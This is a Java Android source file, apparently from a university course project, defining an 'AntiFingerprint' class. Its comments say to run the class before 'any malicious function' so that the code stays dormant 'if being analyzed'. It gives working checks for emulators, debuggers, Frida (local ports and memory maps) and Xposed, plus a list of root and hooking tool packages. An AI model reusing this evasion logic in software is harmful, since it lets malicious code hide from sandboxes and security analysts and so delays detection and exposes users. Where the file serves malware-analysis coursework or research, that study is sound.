package com.example.inf2007_mad_j1847.test;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.Socket;

public class AntiFingerprint {

    private static final String TAG = "AntiFingerprint";
    private static Boolean cachedResult = null; // cached so check only runs once

    /**
     * Main check — call this before any malicious function
     * Returns true if safe to run, false if being analyzed
     */
    public static boolean isSafeToRun(Context context) {
        if (cachedResult != null) {
            return cachedResult; // return cached result
        }

        boolean emulator = isEmulator();
        boolean debugger = isDebuggerConnected();
        boolean frida = isFridaRunning();
        boolean xposed = isXposedActive();
        boolean analysisTools = isAnalysisToolsInstalled(context);

        Log.d(TAG, "===== AntiFingerprint Check =====");
        Log.d(TAG, "Emulator detected: " + emulator);
        Log.d(TAG, "Debugger detected: " + debugger);
        Log.d(TAG, "Frida detected: " + frida);
        Log.d(TAG, "Xposed detected: " + xposed);
        Log.d(TAG, "Analysis tools detected: " + analysisTools);

        boolean safe = !emulator && !debugger && !frida && !xposed && !analysisTools;
        Log.d(TAG, "Safe to run: " + safe);

        cachedResult = safe;
        return safe;
    }

    /**
     * Reset cache — call if you want to re-check
     */
    public static void resetCache() {
        cachedResult = null;
    }

    // ========== EMULATOR FINGERPRINT ==========
    private static boolean isEmulator() {
        boolean result =
                Build.FINGERPRINT.startsWith("generic") ||
                        Build.FINGERPRINT.startsWith("unknown") ||
                        Build.FINGERPRINT.contains("emulator") ||
                        Build.FINGERPRINT.contains("sdk_gphone") ||
                        Build.MODEL.contains("google_sdk") ||
                        Build.MODEL.contains("Emulator") ||
                        Build.MODEL.contains("Android SDK built for x86") ||
                        Build.MODEL.contains("sdk_gphone") ||
                        Build.MANUFACTURER.contains("Genymotion") ||
                        Build.BRAND.startsWith("generic") ||
                        Build.DEVICE.startsWith("generic") ||
                        Build.PRODUCT.contains("sdk") ||
                        Build.PRODUCT.contains("emulator") ||
                        Build.HARDWARE.contains("goldfish") ||
                        Build.HARDWARE.contains("ranchu") ||
                        "google_sdk".equals(Build.PRODUCT);

        Log.d(TAG, "isEmulator: " + result + " | model=" + Build.MODEL
                + " fingerprint=" + Build.FINGERPRINT);
        return result;
    }

    // ========== DEBUGGER DETECTION ==========
    private static boolean isDebuggerConnected() {
        boolean result = android.os.Debug.isDebuggerConnected()
                || android.os.Debug.waitingForDebugger();
        Log.d(TAG, "isDebuggerConnected: " + result);
        return result;
    }

    // ========== FRIDA DETECTION (Anti-hooking) ==========
    private static boolean isFridaRunning() {
        // Check 1: Frida default port 27042
        try {
            Socket socket = new Socket("127.0.0.1", 27042);
            socket.close();
            Log.d(TAG, "Frida port 27042 is open!");
            return true;
        } catch (Exception ignored) {}

        // Check 2: Frida alternative port 27043
        try {
            Socket socket = new Socket("127.0.0.1", 27043);
            socket.close();
            Log.d(TAG, "Frida port 27043 is open!");
            return true;
        } catch (Exception ignored) {}

        // Check 3: Frida library in memory maps
        try {
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(
                            Runtime.getRuntime().exec("cat /proc/self/maps").getInputStream()
                    )
            );
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("frida") || line.contains("gadget")) {
                    Log.d(TAG, "Frida found in memory maps: " + line);
                    reader.close();
                    return true;
                }
            }
            reader.close();
        } catch (Exception ignored) {}

        return false;
    }

    // ========== XPOSED DETECTION (Anti-hooking) ==========
    private static boolean isXposedActive() {
        // Check 1: Stack trace method
        try {
            throw new Exception("xposed_check");
        } catch (Exception e) {
            for (StackTraceElement element : e.getStackTrace()) {
                if (element.getClassName().contains("de.robv.android.xposed")) {
                    Log.d(TAG, "Xposed found in stack trace!");
                    return true;
                }
            }
        }

        // Check 2: Xposed bridge class
        try {
            Class.forName("de.robv.android.xposed.XposedBridge");
            Log.d(TAG, "XposedBridge class found!");
            return true;
        } catch (ClassNotFoundException ignored) {}

        // Check 3: Xposed files on device
        String[] xposedFiles = {
                "/system/bin/app_process_xposed",
                "/system/lib/libxposed_art.so",
                "/data/data/de.robv.android.xposed.installer"
        };
        for (String path : xposedFiles) {
            if (new File(path).exists()) {
                Log.d(TAG, "Xposed file found: " + path);
                return true;
            }
        }

        return false;
    }

    // ========== ANALYSIS TOOLS DETECTION ==========
    private static boolean isAnalysisToolsInstalled(Context context) {
        String[] suspiciousPackages = {
                "de.robv.android.xposed.installer",   // Xposed installer
                "com.saurik.substrate",                // Cydia Substrate
                "com.devadvance.rootcloak",            // RootCloak
                "com.devadvance.rootcloakplus",        // RootCloak+
                "com.amphoras.hidemyroot",             // HideMyRoot
                "com.formyhm.hiderootPremium",         // HideMyRoot Premium
                "com.zachspong.temprootremovejingit",  // TempRoot
                "com.noshufou.android.su",             // SuperUser
                "com.thirdparty.superuser",            // SuperUser
                "eu.chainfire.supersu",                // SuperSU
                "com.topjohnwu.magisk",                // Magisk
                "me.phh.superuser",                    // PHH SuperUser
                "com.android.vending.billing.InAppBillingService.COIN" // Lucky Patcher
        };

        PackageManager pm = context.getPackageManager();
        for (String pkg : suspiciousPackages) {
            try {
                pm.getPackageInfo(pkg, 0);
                Log.d(TAG, "Suspicious package found: " + pkg);
                return true;
            } catch (PackageManager.NameNotFoundException ignored) {}
        }

        return false;
    }
}